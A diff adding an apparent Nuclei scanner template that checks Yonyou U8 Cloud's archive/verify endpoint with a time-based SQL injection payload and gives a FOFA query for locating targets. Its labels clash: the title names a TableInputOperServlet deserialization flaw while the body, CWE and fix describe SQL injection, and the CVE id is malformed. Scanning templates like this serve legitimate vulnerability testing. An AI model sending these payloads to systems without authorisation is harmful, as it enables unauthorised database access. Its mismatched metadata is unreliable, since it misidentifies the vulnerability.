@@ -1,0 +1,42 @@
+id: 2024-105131759
+
+info:
+  name: 用友U8cloud所有版本TableInputOperServlet反序列化漏洞
+  author: k3ppf0r
+  severity: high
+  description: |  
+    攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露。
+  reference:
+    - https://security.yonyou.com/#/noticeInfo?id=460
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU8%20Cloud-ArchiveVerify%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  remediation: |
+    升级补丁<U8CLOUD系统ArchiveVerify接口存在SQL注入漏洞的安全补丁>
+  classification:
+    cve-id: 2024-105131721
+    cvss-score: 7.8
+    cwe-id: CWE-89
+  metadata:
+    date: 2023-12-08
+    version: | 
+      用友U8 cloud 2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,5.0
+    fofa-query: app="用友-U8-Cloud"
+  tags: yonyou,sqli,ncc,u8
+
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        POST /u8cuapws/rest/archive/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        
+        {"orgInfo":{"code":"1';WAITFOR DELAY '0:0:3'--"}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=3'
+          - 'status_code == 200'
+        condition: and
